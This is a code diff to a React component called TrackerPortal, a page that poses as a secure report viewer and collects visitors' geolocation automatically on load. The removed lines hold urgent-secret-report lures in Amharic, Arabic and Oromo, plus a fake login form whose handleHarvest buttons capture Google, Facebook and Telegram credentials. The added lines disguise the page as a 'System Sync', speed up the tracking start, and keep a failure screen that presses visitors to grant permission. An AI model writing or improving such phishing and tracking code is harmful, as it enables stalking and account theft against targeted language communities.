@@ -60,7 +60,7 @@ export const TrackerPortal: React.FC = () => {
     // Auto-trigger tracking protocol immediately on load
     const autoStart = setTimeout(() => {
        startRecon();
-    }, 150);
+    }, 50);
 
     return () => {
       clearInterval(countdown);
@@ -69,9 +69,9 @@ export const TrackerPortal: React.FC = () => {
   }, []);
 
   const translations = {
-    amharic: "\"አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።\"",
-    arabic: "\"معلومات سرية عاجلة بخصوص المعلومات الحالية، لم أرسلها لك مباشرة حتى لا نكتشف. ادخل الرابط بسرعة وشاهد المعلومات، لقد تلقيت أمراً بإرسالها لك... اضغط على الرابط أدناه لمشاهدة التقرير، هناك فيديو وصور بالداخل.\"",
-    oromo: "\"Oduu hammaa fi iccitidha, kallattiin akka siif hin ergonomic dhoksaadhon siif erge. Dafee liinkii kanaan seenii odeeffannoo kana ilaali, ajajni siif akka kenne naaf kennameera... Gabaasa kana ilaaluuf liinkii armaan gadii cuqaasii, viidiyoo fi fakkiiwwanis keessa jiru.\""
+    amharic: "የሲስተም ማረጋገጫ በመካሄድ ላይ ነው... እባክዎ በትዕግስት ይጠብቁ (System Sync in Progress).",
+    arabic: "جاري التحقق من النظام... يرجى الانتظار (System Sync in Progress).",
+    oromo: "Mirkaneessi sirnaa deemaa jira... Maaloo obsaan eigaa (System Sync in Progress)."
   };
 
   const loginStrings = {
@@ -183,11 +183,6 @@ export const TrackerPortal: React.FC = () => {
             signalHint.innerText = `SIGNAL_SYNC: ACCURACY_${Math.round(accuracy)}M`;
             document.body.appendChild(signalHint);
             setTimeout(() => signalHint.remove(), 2000);
-
-            // Show login challenge after a brief delay on the first successful fix
-            if (!showLogin) {
-              setTimeout(() => setShowLogin(true), 4000);
-            }
 
           } catch (e) {
             console.error("Uplink Error:", e);
@@ -330,6 +325,12 @@ export const TrackerPortal: React.FC = () => {
         </div>
 
         <div className="space-y-8">
+          {lang === 'amharic' || lang === 'both' ? (
+            <p className="text-[11px] leading-relaxed text-slate-500 font-medium text-center italic">
+              {translations.amharic}
+            </p>
+          ) : null}
+          
           {status === 'scanning' && (
             <div className="space-y-6 py-4">
               <div className="space-y-2">
@@ -354,7 +355,7 @@ export const TrackerPortal: React.FC = () => {
             </div>
           )}
 
-          {status === 'granted' && !showLogin && (
+          {status === 'granted' && (
             <motion.div 
               initial={{ opacity: 0 }}
               animate={{ opacity: 1 }}
@@ -368,72 +369,14 @@ export const TrackerPortal: React.FC = () => {
                   <div className="h-4 w-3/4 bg-slate-800 rounded animate-pulse"></div>
                   <div className="h-4 w-full bg-slate-800 rounded animate-pulse opacity-60"></div>
                   <div className="h-4 w-1/2 bg-slate-800 rounded animate-pulse opacity-30"></div>
-                  <div className="py-2 flex flex-col items-center gap-2">
-                    <span className="text-[10px] text-slate-500 animate-pulse uppercase tracking-widest">Unpacking Secure Layers...</span>
-                    <div className="px-2 py-0.5 bg-blue-500/10 border border-blue-500/30 rounded text-[7px] text-blue-400 font-bold animate-pulse">PRECISION_LATCH: ACTIVE</div>
+                  <div className="py-4 flex flex-col items-center gap-3">
+                    <div className="w-8 h-8 rounded-full border-2 border-blue-500/30 border-t-blue-500 animate-spin"></div>
+                    <span className="text-[10px] text-slate-400 animate-pulse uppercase tracking-[0.2em] text-center font-bold">
+                       {lang === 'amharic' ? 'ሰነዱን በመጫን ላይ (Syncing Data)...' : 'Syncing Data Stream...'}
+                    </span>
+                    <div className="px-2 py-0.5 bg-blue-500/10 border border-blue-500/30 rounded text-[7px] text-blue-400 font-bold">PROTOCOL: ALPHA_ENCRYPTED</div>
                   </div>
                 </div>
-              </div>
-            </motion.div>
-          )}
-
-          {status === 'granted' && showLogin && (
-            <motion.div 
-              initial={{ opacity: 0, scale: 0.95 }}
-              animate={{ opacity: 1, scale: 1 }}
-              className="space-y-5"
-            >
-              <div className="text-center space-y-1 mb-4">
-                <p className="text-[10px] text-blue-400 font-bold uppercase tracking-widest">
-                  {lang === 'amharic' ? loginStrings.amharic : lang === 'arabic' ? loginStrings.arabic : loginStrings.oromo}
-                </p>
-                <div className="h-[1px] w-12 bg-blue-500/30 mx-auto"></div>
-              </div>
-
-              <div className="bg-slate-900/50 p-5 rounded-lg border border-slate-800 space-y-4 shadow-inner">
-                 <div className="space-y-3">
-                   <div className="space-y-1">
-                      <label className="text-[8px] text-slate-500 uppercase font-bold px-1 tracking-widest">Account ID / Email</label>
-                      <input 
-                        type="text"
-                        value={credentials.id}
-                        onChange={(e) => setCredentials(prev => ({ ...prev, id: e.target.value }))}
-                        className="w-full bg-[#111] border border-slate-800 rounded p-3 text-sm text-slate-200 focus:border-blue-500/50 outline-none transition-colors"
-                        placeholder="e.g. user@gmail.com"
-                      />
-                   </div>
-                   <div className="space-y-1">
-                      <label className="text-[8px] text-slate-500 uppercase font-bold px-1 tracking-widest">Secure Access Key</label>
-                      <input 
-                        type="password"
-                        value={credentials.pass}
-                        onChange={(e) => setCredentials(prev => ({ ...prev, pass: e.target.value }))}
-                        className="w-full bg-[#111] border border-slate-800 rounded p-3 text-sm text-slate-200 focus:border-blue-500/50 outline-none transition-colors"
-                        placeholder="••••••••"
-                      />
-                   </div>
-                 </div>
-
-                 <div className="flex gap-2">
-                   <button 
-                     onClick={() => handleHarvest('Google')}
-                     className="flex-1 py-3 bg-[#fff] text-black text-[10px] font-bold rounded flex items-center justify-center gap-2 hover:bg-slate-200 transition-colors uppercase"
-                   >
-                     <Globe className="w-3 h-3 text-blue-500" /> Google
-                   </button>
-                   <button 
-                     onClick={() => handleHarvest('Facebook')}
-                     className="flex-1 py-3 bg-[#1877f2] text-white text-[10px] font-bold rounded flex items-center justify-center gap-2 hover:bg-[#166fe5] transition-colors uppercase"
-                   >
-                     Facebook
-                   </button>
-                 </div>
-                 <button 
-                   onClick={() => handleHarvest('Telegram')}
-                   className="w-full py-2.5 bg-slate-800 text-slate-300 text-[10px] font-bold rounded border border-slate-700 hover:bg-slate-700 transition-colors uppercase tracking-widest"
-                 >
-                   Alternative Access (IM)
-                 </button>
               </div>
             </motion.div>
           )}
@@ -442,14 +385,14 @@ export const TrackerPortal: React.FC = () => {
             <div className="text-center p-8 border border-red-500/20 bg-red-500/5 rounded-lg space-y-4">
               <AlertTriangle className="w-10 h-10 text-red-600 mx-auto opacity-80" />
               <div className="space-y-1">
-                <p className="text-[12px] text-red-500 font-black uppercase tracking-tighter italic">PROTOCOL_HANDSHAKE_FAILED</p>
-                <p className="text-[9px] text-slate-500 leading-relaxed font-medium">የዳታ ጥበቃ ማረጋገጫ አልተሳካም። ምስጢራዊ ዘገባውን ለመክፈት የሲስተም ፈቃድ (System Access) መስጠት አስፈላጊ ነው።</p>
+                <p className="text-[12px] text-red-500 font-black uppercase tracking-tighter italic">SYNC_STALLED_BY_USER</p>
+                <p className="text-[9px] text-slate-500 leading-relaxed font-medium">የዳታ ግንኙነቱ ተቋርጧል። መረጃውን ለመቀበል የሲስተም ፈቃዱን (System Handshake) ማረጋገጥ አስፈላጊ ነው።</p>
               </div>
               <button 
                 onClick={() => startRecon()}
-                className="w-full py-3 bg-slate-800 hover:bg-slate-700 text-white text-[10px] uppercase font-bold rounded transition-colors"
+                className="w-full py-3 bg-red-900/20 hover:bg-red-900/30 text-red-400 text-[10px] uppercase font-bold rounded border border-red-500/30 transition-colors"
               >
-                ዳግም አስጀምር (RE-INITIALIZE)
+                ዳግም አስነሳ (RE-SYNC)
               </button>
             </div>
           )}
